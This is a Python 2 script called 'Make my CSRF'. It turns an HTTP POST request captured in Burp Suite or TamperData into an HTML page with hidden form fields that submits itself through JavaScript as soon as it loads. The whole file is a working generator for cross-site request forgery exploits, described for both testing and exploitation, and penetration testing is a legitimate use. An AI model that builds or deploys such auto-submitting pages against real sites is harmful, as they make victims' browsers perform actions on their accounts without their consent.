#!/usr/bin/python
import sys
import re
import urllib
import getopt

def usage():
	print "======================================"
	print "           Make my CSRF		     "
	print "     author : Mickael Dorigny         "
	print " @MickaelDorigny - http://synetis.com "
	print "    http://information-security.fr    "
	print "======================================"
	print "\nHelp :\n"
	print "This tool will help you to create you auto-submit HTML form for CSRF vulnerability testing and exploitation."
	print "It takes input from TamperData or BurpSuite analysis. Just copy/paste the request content in a in.txt file and give it to this script."
	print "\nUsage : python " + sys.argv[0] + " -i <input file> -f <format>"
	print " -f : Data format, possible format are :\n    Burp (for Burpsuite)\n    Tamper (for TamperData)"
	print " -i : input file containing data"
	print " -o : output file destination, otherwhise output is written in terminal"
	print "\n===================================\nExample :\n"
	print "./makeMyCSRF -i in.txt -f Burp"
	print "./makeMyCSRF -i in.txt -f Tamper"
	return

def processBurpSuite(data):
	servName= re.search("Host: (.*)User-Agent", data, re.IGNORECASE)
	servURL = re.search("POST (.*) HTTP/", data, re.IGNORECASE)
	output= "<form method=POST action='http://" + servName.group(1) + servURL.group(1)+"'>\n"
	parameters = re.search("Connection:.close(.*)$", data, re.IGNORECASE)
	parameters = parameters.group(1)
	parameters = urllib.unquote(parameters.encode('ascii')).decode('utf-8')
	
	# Split each parameter
	tabParameters = parameters.split("&")
	
	# Write input HTML form from parameters
	for parameter in tabParameters:
		tabParam = parameter.split("=")
		output = output +"\t<input type=hidden name='"+tabParam[0]+"'\tvalue='"+tabParam[1]+"'>\n"
	return output

def processTamperData(data):
        servURL = re.search("POST (.*) Load Flag", data, re.IGNORECASE)
        output = "<form method=POST action='"+ servURL.group(1)+"'>\n"
        parameters = re.search("Post Data:      (.*)   Response", data, re.IGNORECASE)
        parameters = parameters.group(1)
	parameters = parameters.replace ("      ","&")
        parameters = urllib.unquote(parameters.encode('ascii')).decode('utf-8')

        # Split each parameter
        tabParameters = parameters.split("&")

        # Write input HTML form from parameters
        for parameter in tabParameters:
		tabParamArg = re.search(".*\[(.*)\]$", parameter, re.IGNORECASE)
		paramArg = tabParamArg.group(1)
		tabParamName = re.search("(.*)\[" ,parameter, re.IGNORECASE)
	        output = output +"\t<input type=hidden name='"+tabParamName.group(1)+"'\tvalue='"+tabParamArg.group(1)+"'>\n"
        return output

myopts, args = getopt.getopt(sys.argv[1:], "i:o:f:h")
outputFile=""

if len(sys.argv) > 2:
        inputFile = sys.argv[1]
        dataFormat = sys.argv[2]
else:
	usage()
        exit(0)
for o, a in myopts:
	if o == "-o":
		outputFile = a
	if o == "-h":
		usage()
		exit(0)		
	if o == "-i":
		inputFile = a
	if o == "-f":
		dataFormat = a

dataToProcess = ""
# Process data to delete return and space. 
# more easy to process then
inFile = open(inputFile)

Display = "<html><body> \n"

for line in inFile:
    dataToProcess = dataToProcess + line.rstrip('\r\n')

if dataFormat == "Burp":
	Display = Display + processBurpSuite (dataToProcess)
elif dataFormat == "Tamper":
	Display = Display + processTamperData (dataToProcess)
else :
	print "Please specifiy an available data format"
	usage()
	exit(0)

Display = Display +"\t<input style=\"display:none\" type=submit>\n<form>\n<script>document.forms[0].submit();</script>\n</body></html>"


if outputFile != "":
	file = open(outputFile, "w")
	file.write(Display)
	file.close()
	print "Your HTML from is in this file : "+outputFile
else:
	print Display
